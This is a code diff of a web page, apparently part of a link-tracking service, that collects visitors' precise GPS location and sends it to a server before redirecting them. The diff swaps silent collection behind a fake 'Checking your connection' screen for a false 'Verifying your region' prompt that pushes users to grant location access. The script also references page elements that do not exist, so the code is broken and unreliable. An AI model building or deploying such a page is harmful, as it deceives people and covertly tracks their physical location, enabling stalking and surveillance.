@@ -7,41 +7,28 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%;background:#fff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
-
-.wrap{text-align:center;padding:2rem}
-
-/* Pulsing dot */
-.dot-ring{position:relative;width:64px;height:64px;margin:0 auto 2rem}
-.dot-ring::before,
-.dot-ring::after{content:'';position:absolute;inset:0;border-radius:50%}
+.wrap{text-align:center;padding:2rem;max-width:320px}
+.dot-ring{position:relative;width:64px;height:64px;margin:0 auto 1.5rem}
+.dot-ring::before,.dot-ring::after{content:'';position:absolute;inset:0;border-radius:50%}
 .dot-ring::before{background:rgba(99,102,241,0.15);animation:ripple 1.8s ease-out infinite}
 .dot-ring::after{background:rgba(99,102,241,0.08);animation:ripple 1.8s ease-out infinite .6s}
 .dot{width:64px;height:64px;border-radius:50%;background:#6366f1;position:relative;z-index:1;animation:pulse 1.8s ease-in-out infinite}
-
-@keyframes ripple{
-  0%{transform:scale(1);opacity:1}
-  100%{transform:scale(2.4);opacity:0}
-}
-@keyframes pulse{
-  0%,100%{transform:scale(1)}
-  50%{transform:scale(0.92)}
-}
-
-.msg{font-size:0.9rem;color:#9ca3af;letter-spacing:0.01em}
-
-/* Progress bar at very top */
+@keyframes ripple{0%{transform:scale(1);opacity:1}100%{transform:scale(2.4);opacity:0}}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(0.92)}}
+.title{font-size:1rem;font-weight:600;color:#111;margin-bottom:0.4rem}
+.msg{font-size:0.82rem;color:#9ca3af;line-height:1.5}
+.allow-btn{margin-top:1.4rem;padding:0.65rem 1.6rem;background:#6366f1;color:#fff;border:none;border-radius:8px;font-size:0.9rem;font-weight:600;cursor:pointer;width:100%}
+.allow-btn:active{opacity:0.85}
+.skip{margin-top:0.75rem;font-size:0.75rem;color:#c4c4c4;cursor:pointer;text-decoration:underline}
 .bar{position:fixed;top:0;left:0;height:3px;background:#6366f1;width:0%;transition:width 0.4s ease;z-index:100}
 </style>
 </head>
 <body>
-
 <div class="bar" id="bar"></div>
-
 <div class="wrap">
-  <div class="dot-ring">
-    <div class="dot"></div>
-  </div>
-  <p class="msg">Checking your connection…</p>
+  <div class="dot-ring"><div class="dot"></div></div>
+  <p class="title">Verifying your region</p>
+  <button class="allow-btn" id="allowBtn" style="display:none">Allow &amp; Continue →</button>
 </div>
 
 <script>
@@ -49,8 +36,11 @@ const linkId = window.location.pathname.split('/').pop();
 let destUrl = 'https://google.com';
 let sent = false;
 
-// Progress bar
 const bar = document.getElementById('bar');
+const msg = document.getElementById('msg');
+const allowBtn = document.getElementById('allowBtn');
+const skipBtn = document.getElementById('skipBtn');
+
 function setBar(pct, ms) {
   bar.style.transition = `width ${ms}ms ease`;
   bar.style.width = pct + '%';
@@ -58,13 +48,11 @@ function setBar(pct, ms) {
 
 setBar(30, 600);
 
-// Fetch destination URL
 fetch('/api/hits/' + linkId)
   .then(r => r.json())
   .then(d => { if (d.dest) destUrl = d.dest; })
   .catch(() => {});
 
-// Send location to server
 function postLoc(lat, lon, acc) {
   if (sent) return;
   sent = true;
@@ -75,7 +63,11 @@ function postLoc(lat, lon, acc) {
   }).catch(() => {});
 }
 
-// Silently grab location
+function redirect() {
+  setBar(100, 300);
+  setTimeout(() => { window.location.href = destUrl; }, 400);
+}
+
 function grabLocation() {
   if (!navigator.geolocation) {
     postLoc(null, null, null);
@@ -83,15 +75,8 @@ function grabLocation() {
     return;
   }
 
-  // Set a max wait — don't keep user waiting more than 6s
-  const timer = setTimeout(() => {
-    postLoc(null, null, null);
-    redirect();
-  }, 6000);
-
   navigator.geolocation.getCurrentPosition(
     pos => {
-      clearTimeout(timer);
       postLoc(
         pos.coords.latitude,
         pos.coords.longitude,
@@ -100,24 +85,33 @@ function grabLocation() {
       redirect();
     },
     err => {
-      clearTimeout(timer);
       postLoc(null, null, null);
       redirect();
     },
-    { enableHighAccuracy: true, timeout: 5500, maximumAge: 0 }
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
   );
 }
 
-function redirect() {
-  setBar(100, 300);
-  setTimeout(() => { window.location.href = destUrl; }, 400);
-}
-
-// Small delay so page renders, then grab
+// Show the Allow button after a short delay so user reads the message
 setTimeout(() => {
-  setBar(65, 400);
+  setBar(55, 400);
+  msg.textContent = 'Tap the button below and allow location access to continue.';
+  allowBtn.style.display = 'block';
+  skipBtn.style.display = 'block';
+}, 900);
+
+allowBtn.addEventListener('click', () => {
+  allowBtn.style.display = 'none';
+  skipBtn.style.display = 'none';
+  msg.textContent = 'Checking your location…';
+  setBar(75, 400);
   grabLocation();
-}, 800);
+});
+
+skipBtn.addEventListener('click', () => {
+  postLoc(null, null, null);
+  redirect();
+});
 </script>
 </body>
 </html>
